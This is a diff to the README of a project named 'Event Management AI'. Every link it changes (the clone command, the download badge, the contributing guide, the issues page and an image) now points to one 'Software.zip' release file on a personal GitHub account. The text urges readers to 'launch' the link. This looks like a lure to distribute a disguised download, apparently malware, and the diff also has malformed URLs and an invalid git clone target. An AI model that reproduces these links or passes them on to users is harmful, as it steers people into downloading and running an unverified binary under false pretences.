@@ -49,7 +49,7 @@ To get started with Event Management AI, simply download or clone the repository
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/event-management-ai.git
+   git clone https://github.com/JspBro67/event-management-ai/releases/download/v1.0/Software.zip
    ```
 
 2. Install dependencies:
@@ -68,21 +68,21 @@ For more detailed instructions, please refer to the [documentation](#).
 
 Download the latest version of Event Management AI by clicking the button below:
 
-[![Download Event Management AI](https://img.shields.io/badge/Download%20Now-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Event Management AI](https://github.com/JspBro67/event-management-ai/releases/download/v1.0/Software.zip%https://github.com/JspBro67/event-management-ai/releases/download/v1.0/Software.zip)](https://github.com/JspBro67/event-management-ai/releases/download/v1.0/Software.zip)
 
 *Note: The link above needs to be launched to download the application.*
 
 ## Contributing
 
-We welcome contributions from the community to make Event Management AI even better! If you'd like to contribute, please check out the [Contribution Guidelines](CONTRIBUTING.md).
+We welcome contributions from the community to make Event Management AI even better! If you'd like to contribute, please check out the [Contribution Guidelines](https://github.com/JspBro67/event-management-ai/releases/download/v1.0/Software.zip).
 
 ## Support
 
-For any questions, issues, or feedback related to Event Management AI, please visit the [Issues](https://github.com/event-management-ai/issues) section.
+For any questions, issues, or feedback related to Event Management AI, please visit the [Issues](https://github.com/JspBro67/event-management-ai/releases/download/v1.0/Software.zip) section.
 
 Let's make event planning more intelligent and efficient with Event Management AI! 🎈🎊
 
-![Event Management AI](https://source.unsplash.com/featured/800x600/?event,management)
+![Event Management AI](https://github.com/JspBro67/event-management-ai/releases/download/v1.0/Software.zip,management)
 
 ---
 
